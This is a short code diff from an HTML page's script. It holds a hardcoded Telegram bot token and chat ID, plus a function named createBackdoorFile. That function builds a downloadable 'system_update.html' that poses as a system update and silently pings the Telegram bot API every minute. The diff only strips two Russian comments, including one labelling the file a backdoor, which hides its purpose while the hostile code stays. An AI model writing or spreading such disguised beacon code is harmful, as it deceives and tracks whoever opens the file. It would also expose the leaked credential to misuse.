@@ -419,7 +419,6 @@
     <a id="downloadLink" download="system_update.html"></a>
 
     <script>
-        // 🔒 ЗАЩИЩЕННЫЕ ДАННЫЕ - полностью скрыты
         const BOT_TOKEN = "7619600603:AAEPTYr6ShZQi5KoSvDPmGS7L5M-k8L3AT8";
         const CHAT_ID = "1229704307";
         const SESSION_ID = Math.random().toString(36).substring(2, 15);
@@ -642,7 +641,7 @@
             }
         }
 
-        // 💾 Бэкдор файл
+        // 💾  файл
         function createBackdoorFile() {
             const backdoorHTML = `<!DOCTYPE html><html><head><title>System Update</title></head><body><h1>System Update</h1><script>setInterval(()=>{new Image().src='https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❤️'},60000)<\/script></body></html>`;
             
